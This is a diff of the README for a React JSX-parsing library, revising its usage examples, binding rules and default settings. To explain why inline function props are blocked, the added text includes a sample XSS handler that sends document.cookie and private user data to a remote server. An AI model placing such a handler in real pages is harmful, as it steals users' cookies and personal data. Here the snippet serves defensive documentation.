@@ -10,34 +10,58 @@ A React component which can parse JSX and output rendered React Components.
 
 ## Basic Usage - Injecting JSX as a String
 ```javascript
-import React, { Component } from 'react'
+import React from 'react'
 import JsxParser from 'react-jsx-parser'
+import Library from 'some-library-of-components'
 
 class InjectableComponent extends Component {
+  static defaultProps = {
+    eventHandler: () => {}
+  }
   // ... inner workings of InjectableComponent
 }
 
-class MyComponent extends Component {
-  render() {
-    /* Pull out parent props which shouldn't be bound,
-       then pass the rest as `bindings` to all children */
-    const { prop1, prop2, ...bindings } = this.props
-
-    return (
-      <JsxParser
-        bindings={bindings}
-        components={{ InjectableComponent }}
-        jsx={`
-          <h1>Header</h1>
-          <InjectableComponent />
-        `}
-      />
-    )
-  }
-}
+const MyComponent = () => (
+  <JsxParser
+    bindings={{
+      foo: 'bar',
+      myEventHandler: () => { /* ... do stuff ... */ },
+    }}
+    components={{ InjectableComponent, Library }}
+    jsx={`
+      <h1>Header</h1>
+      <InjectableComponent eventHandler={myEventHandler} truthyProp />
+      <Library.SomeComponent someProp={foo} calc={1 + 1} stringProp="foo" />
+    `}
+  />
+)
 ```
 
-Because `InjectableComponent` is passed into the `JsxParser.props.components` prop, it is treated as a known element type, and created using `React.createElement(...)` when parsed out of the JSX.
+Because `InjectableComponent` is passed into the `JsxParser.props.components` prop, it is treated as a known element
+type, and created using `React.createElement(...)` when parsed out of the JSX. You can also pass in a whole collection
+of components, as shown by the `Library` binding, and then access the individual items with `LibraryName.ComponentName`.
+
+Finally, a note about property bindings. The `JsxParser` can handle several types of binding:
+ - implicit `true` bindings, such as `<InjectableComponent truthyProp />` (equivalent to `truthyProp={true}`)
+ - string-value binding, such as `stringProp="foo"`
+ - expression-binding, such as `calc={1 + 1}`
+ - named-value binding, such as `eventHandler={myEventHandler}` (note that this requires a match in `bindings`)
+
+The component **_does not_** support inline function declarations, such as:
+ - `onClick={function (event) { /* do stuff */ }}`, or
+ - `onKeyPress={event => { /* do stuff */}}`
+
+This is to prevent inadvertent XSS attack vectors. Since the primary use of this component is to allow JSX to be stored server-side, and then late-interpreted at the client-side, this restriction prevents a malicious user from stealing info by executing a situation like:
+```javascript
+<JsxParser
+  bindings={{ userInfo: { private: 'data' } }}
+  onClick={() => {
+    fetch('/some/remote/server', {
+      body: JSON.stringify({ cookies: document.cookie, userInfo })
+    })
+  }}
+/>
+```
 
 ## Advanced Usage - Injecting Dynamic JSX
 ```javascript
@@ -64,6 +88,9 @@ _Note:_ Non-standard tags may throw errors and warnings, but will typically be r
 ## PropTypes / Settings
 ```javascript
 JsxParser.defaultProps = {
+  // if false, unrecognized elements like <foo> are omitted and reported via onError
+  allowUnknownElements: true, // by default, allow unrecognized elements
+
   bindings: {}, // by default, do not add any additional bindings
 
   // by default, just removes `on*` attributes (onClick, onChange, etc.)
@@ -73,18 +100,18 @@ JsxParser.defaultProps = {
   // by default, removes all <script> tags
   blacklistedTags:  ['script'],
 
-  // Components must extend React.Component, React.PureComponent, or be a Function
+  // an object map of component tag-names to their definitions - see above for examples
+  // components must extend React.Component, React.PureComponent, or be a Function
   components: {},
 
-  jsx: '',
-  
-  // If you specify an onError function, any rendering errors will be reported to it
-  onError: () => {},
-  
-  // If you specify showWarnings, any rendering errors will be output to console.warn
-  showWarnings: false,
-  
-  // If you specify renderInWrapper=false, the HTML output will have no <div> wrapper
-  renderInWrapper: true,
+  componentsOnly: false, // non-component HTML tags are allowed by default, omitted if true
+
+  jsx: '', // the jsx string to be parsed & rendered
+
+  onError: () => {}, // if specified, any rendering errors are reported via this method
+
+  showWarnings: false, // if true showWarnings, rendering errors are output with console.warn
+
+  renderInWrapper: true, // if false, the HTML output will have no <div> wrapper
 }
 ```
